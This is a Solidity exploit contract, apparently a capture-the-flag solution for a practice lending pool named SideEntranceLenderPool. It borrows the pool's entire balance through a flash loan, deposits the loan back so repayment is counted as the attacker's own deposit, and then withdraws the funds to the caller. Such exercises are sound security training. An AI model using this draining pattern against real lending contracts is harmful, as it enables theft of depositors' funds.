// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    SideEntranceLenderPool public pool;
    address public recovery;

    constructor(address _pool, address _recovery) {
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
    }

    function attack() public {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
    }

    function execute() public payable {
        if(msg.value > 0) {
            pool.deposit{value: msg.value}();
            pool.flashLoan(0);
        }

        pool.withdraw();
        pool.deposit{value: address(this).balance}();

    }

    function withdraw() public {
        pool.withdraw();
        payable(address(msg.sender)).transfer(address(this).balance);
    }

    receive() external payable {}

}